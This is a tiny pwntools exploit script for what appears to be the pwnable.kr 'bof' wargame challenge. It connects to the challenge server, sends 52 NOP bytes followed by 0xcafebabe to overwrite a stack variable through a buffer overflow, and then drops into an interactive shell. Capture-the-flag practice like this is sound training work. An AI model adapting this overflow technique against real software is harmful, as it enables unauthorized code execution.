from pwn import *
p = remote("pwnable.kr",9000)
p.send(52*'\x90'+p32(0xcafebabe))
p.interactive()
#p.recvline()
#p.recvline()
